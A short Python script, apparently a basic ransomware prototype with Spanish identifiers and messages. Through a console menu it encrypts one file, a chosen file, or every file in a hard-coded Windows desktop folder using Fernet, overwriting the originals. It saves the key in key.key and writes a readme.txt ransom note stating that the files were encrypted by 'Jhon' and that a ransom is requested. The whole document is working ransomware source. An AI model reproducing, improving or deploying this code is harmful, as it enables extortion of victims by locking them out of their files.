from gettext import find
from cryptography.fernet import Fernet
import os


def generarKey():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)


def retornarkey():
    return open("key.key", "rb").read()


def encryp(items, key):
    i = Fernet(key)
    for x in items:
        with open(x, "rb") as file:
            file_data = file.read()
        data = i.encrypt(file_data)

        with open(x, "wb") as file:
            file.write(data) 

def PrincipalDeseado(lcarchivo):
    if __name__ == "__main__":
        print("Ingrese el nombre del archivo con su extensión")
        nombrearchivo = input()
        archivos = lcarchivo ##'C:\\Users\\Brayner\\Desktop\\Nueva'
        archivos_2 = [archivos+'\\'+nombrearchivo]

    generarKey()
    key = retornarkey()

    encryp(archivos_2, key)
    ##print (archivos_2)
    crearchivo(archivos)

def PrincipalUnico(lcarchivo,lcarchivoruta):
    if __name__ == "__main__":

        archivos_2 = lcarchivo ##'C:\\Users\\Brayner\\Desktop\\Nueva'
        archivos = lcarchivoruta##['C:\\Users\\Brayner\\Desktop\\Nueva\\ggg.txt']

    generarKey()
    key = retornarkey()

    encryp(archivos, key)
    ##print (archivos)
    crearchivo(archivos_2)

def PrincipalTodos(lcarchivo):
    if __name__ == "__main__":

        archivos = lcarchivo ##'C:\\Users\\Brayner\\Desktop\\Nueva'
        items = os.listdir(archivos)
        archivos_2 = [archivos+'\\'+x for x in items]

    generarKey()
    key = retornarkey()

    encryp(archivos_2, key)
    ##print (archivos_2)
    crearchivo(archivos)

def crearchivo(archivo):
    if find(archivo+"\\"+"readme.txt"):
        os.remove(archivo+"\\"+"readme.txt")
    with open(archivo+"\\"+"readme.txt", "w") as file:
        file.write("Archivos encriptados por Jhon\n")
        file.write("Se solicita rescate")

lcvalor = 0
while lcvalor < 4:
    archivo = 'C:\\Users\\Brayner\\Desktop\\Nueva'
    archivo2= ['C:\\Users\\Brayner\\Desktop\\Nueva\\ggg.txt']
    if find(archivo+"\\"+"readme.txt"):
        os.remove(archivo+"\\"+"readme.txt")
    print("----Encriptacion de archivos----")
    print("Seleccione alguna opcion:")
    print("Encriptar Un solo archivo:1")
    print("Encriptar archivo deseado:2")
    print("Encriptar Todo           :3")
    print("Salir                    :4")
    lcvalor = int(input())
    if lcvalor == 1:
        PrincipalUnico(archivo,archivo2)
        print("Encriptacion finalizado")
    elif lcvalor == 2:
        PrincipalDeseado(archivo)
        print("Encriptacion finalizado")
    elif lcvalor == 3:
        PrincipalTodos(archivo)
        print("Encriptacion finalizado")
        lcvalor = 5
    elif lcvalor == 4:
        print("Encriptacion finalizado")